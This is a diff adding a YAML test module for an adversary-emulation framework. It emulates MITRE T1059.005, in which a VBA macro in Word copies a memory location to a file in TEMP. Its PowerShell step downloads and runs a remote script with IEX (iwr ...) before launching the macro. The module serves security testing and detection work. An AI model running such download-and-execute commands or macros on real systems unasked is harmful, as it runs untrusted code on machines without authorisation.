@@ -1,0 +1,29 @@
+api_version: "2.0"
+name: Extract Memory via VBA
+description: |
+    This module attempts to emulate malware authors utilizing well known techniques to extract data from memory/binary files. To do this
+    we first create a string in memory then pull out the pointer to that string. Finally, it uses this pointer to copy the contents of that
+    memory location to a file stored in the $env:TEMP\atomic_t1059_005_test_output.bin.
+args:
+    - name: ms_product
+      type: string
+      default: Word
+uuid: 8faff437-a114-4547-9a60-749652a03df6
+mitre:
+    tactics:
+        - 'TA0002: Execution'
+    techniques:
+        - 'T1059: Command and Scripting Interpreter'
+    subtechniques:
+        - 'T1059.005: Visual Basic'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: extract-memory-via-vba
+      inline: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059_005-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\"\n"
+      executor: powershell
+      cleanup:
+        inline: |
+            Remove-Item "$env:TEMP\atomic_t1059_005_test_output.bin" -ErrorAction Ignore
+        executor: powershell
